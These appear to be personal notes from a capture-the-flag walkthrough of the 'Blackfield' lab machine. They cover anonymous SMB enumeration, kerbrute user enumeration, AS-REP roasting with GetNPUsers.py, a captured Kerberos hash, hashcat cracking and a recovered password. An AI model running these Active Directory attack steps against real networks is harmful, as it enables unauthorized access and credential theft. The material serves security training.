
```
smbclient -L 10.10.10.192 -U 'anonymous'
```
![[Pasted image 20231117113545.png]]
We are only able to access profiles$ through SMB with anonymous login for now
```
prompt off
recurse on
ls
mget *
```

I think this is the list of users in the profile directory so i have copied everything in a txt file
```
for d in ./*;do [[ -d "$d" ]] && echo "${d##./}" >> dir.txt; done
```
So let's run this list in the kerbute to check my theory if the users are valid or not.

```

```

```
enum4linux -a 10.10.10.192
Domain Name: BLACKFIELD                                                        
Domain Sid: S-1-5-21-4194615774-2175524697-3563712290
```

As Port 88 is open (i.e. aka kerberos ) so it's good to run kerbrute to see if we can have any valid users
```
kerbrute userenum -d blackfield.local --dc 10.10.10.192 userlist.txt -t 100
```

![[Pasted image 20231117121845.png]]

Yup i got more valid users
![[Pasted image 20231117121955.png]]
```
audit2020@blackfield.local
support@blackfield.local
svc_backup@blackfield.local
Administrator@blackfield.local
administrator@blackfield.local
guest@blackfield.local
LYDERICLEFEBVRE@BLACKFIELD.LOCAL
```

So a service is running it's worth to see if we can get a kerbos ticket hash out of it or not.
No we are not able to get the service ticket this time
```
GetNPUsers.py -dc-ip 10.10.10.192  blackfield.local/svc_backup -no-pass
```
![[Pasted image 20231117125042.png]]
Let's try with audit as it seems juicy to me
This way don't seems to be working but i have seems another way when enumerating Forest

AS-REP Roasting
AS-REP Roasting with GetNPUsers which does not require a preauthentication
```
GetNPUsers.py blackfield/ -usersfile userlist.txt -format john -dc-ip 10.10.10.192
```
I have pasted all the users in the userlist and gues what we got the hash
```
$krb5asrep$support@blackfield.local@BLACKFIELD:f95ca094d00fd53e25018957c9fef261$71f916d8dcc4fd660bb810696617786ec4731560ef6836aed49a7033d0cc94b5d34c8777db47b128521e56b7b06f66197e60b77cb14e409c091a9e715039851eb6fbc9f952b8963e0e8fd5f0825479b376438c5cfddd48290a627ff1a8c8eba7de79b6298e28895c5d20f41e1a5ef7b151a8427eb8a926108f917079232a89b1e25b197e573b570cc944520e040375f0077e347b5a5179b078c5f3eb2a85fb8e1878247b9e1530553c1ba241a8887c3e1706171074f172b14b3d23fe9d1f46e37857bf0e38e47177e35ca9b0ac09f80d9255419c356b39ca9923a23c8231aba9812d624a97f825c332ff38bee6be
```
![[Pasted image 20231117125339.png]]

So now we have password let's see if we can use that password to login with another user and see which share we can access using this userid and password
See the hash carefully and got to know that we got the hash for support user and not audit user.
```
support
#00^BlackKnight
```

Let's crack the hash
```
hashcat --help | grep Kerberos
```
![[Pasted image 20231117125521.png]]
as the type was not mentioned so i decided to test every type till we don't get the error for mismatch.

```
.\hashcat.exe -m 18200 -D 2 .\hashes4.txt .\rockyou.txt -O
```
![[Pasted image 20231117130526.png]]
So we were to crack the hash successfully.


Let's see the port 5985 that's bugging me out . We have a list of valid users let's see what we can do now with it

